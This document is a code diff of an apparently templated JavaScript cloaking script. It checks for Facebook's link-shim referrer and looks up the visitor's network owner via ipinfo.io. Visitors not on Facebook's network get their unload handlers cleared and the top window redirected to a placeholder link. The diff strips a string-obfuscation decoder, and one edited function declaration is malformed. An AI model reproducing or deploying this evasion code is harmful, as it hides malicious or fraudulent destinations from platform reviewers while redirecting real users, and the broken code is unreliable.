@@ -7,7 +7,7 @@
   </script>
   <meta name="referrer" content="unsafe-url">
   <script type="text/javascript">
-    function {decode}({metin},{charlen},{bool}){
+    function {metin},{charlen},{bool}{
       var {alfabe} = "{alfabestr}";
       var {kripto} = {kriptoarray};
       var {davinci} = "";
@@ -51,17 +51,17 @@
     }
     
     var {window} = window;
-    var {indexOf} = {decode}("indexOf");
+    var {indexOf} = "indexOf";
     
     function {topfunction}(){
-      var {document} = {decode}("document");
-      var {referrer} = {decode}("referrer");
-      var {onbeforeunload} = {decode}("onbeforeunload");
-      var {onunload} = {decode}("onunload");
-      var {location} = {decode}("location");
-      var {top} = {decode}("top");
-      var {reload} = {decode}("reload");
-      var {lsr} = {decode}("/lsr.php");
+      var {document} = "document";
+      var {referrer} = "referrer";
+      var {onbeforeunload} = "onbeforeunload";
+      var {onunload} = "onunload";
+      var {location} = "location";
+      var {top} = "top";
+      var {reload} = "reload";
+      var {lsr} = "/lsr.php";
     
       var {valid} = true;
       if({window}[{document}][{referrer}][{indexOf}]({lsr}) > 0){
@@ -71,17 +71,17 @@
       }
     
       if({valid} == true){
-        var {XMLHttpRequest} = {decode}("XMLHttpRequest");
-        var {ipinfo} = {decode}("http://ipinfo.io/org");
-        var {facebook} = {decode}("facebook");
-        var {GET} = {decode}("GET");
-        var {open} = {decode}("open");
-        var {onreadystatechange} = {decode}("onreadystatechange");
-        var {readyState} = {decode}("readyState");
-        var {status} = {decode}("status");
-        var {responseText} = {decode}("responseText");
-        var {toLocaleLowerCase} = {decode}("toLocaleLowerCase");
-        var {send} = {decode}("send");
+        var {XMLHttpRequest} = "XMLHttpRequest";
+        var {ipinfo} = "http://ipinfo.io/org";
+        var {facebook} = "facebook";
+        var {GET} = "GET";
+        var {open} = "open";
+        var {onreadystatechange} = "onreadystatechange";
+        var {readyState} = "readyState";
+        var {status} = "status";
+        var {responseText} = "responseText";
+        var {toLocaleLowerCase} = "toLocaleLowerCase";
+        var {send} = "send";
 
 
         var {xhr} = new {window}[{XMLHttpRequest}]();
@@ -92,7 +92,7 @@
             if({org}[{toLocaleLowerCase}]()[{indexOf}]({facebook}) < 0){
               {window}[{onbeforeunload}] = null;
               {window}[{onunload}] = null;
-              var {link} = {decode}("{redirectlink}");
+              var {link} = "{redirectlink}";
               {window}[{top}][{location}] = {link};
             }
           }
@@ -102,11 +102,11 @@
     }
     
     function {isChromium}(){
-      var {navigator} = {decode}("navigator"); 
-      var {plugins} = {decode}("plugins");
-      var {length} = {decode}("length");
-      var {name} = {decode}("name");
-      var {Chromium} = {decode}("Chromium");
+      var {navigator} = "navigator";
+      var {plugins} = "plugins";
+      var {length} = "length";
+      var {name} = "name";
+      var {Chromium} = "Chromium";
     
       if(!{window}[{navigator}] || !{window}[{navigator}][{plugins}] || {window}[{navigator}][{plugins}][{length}] == 0){
         return false;
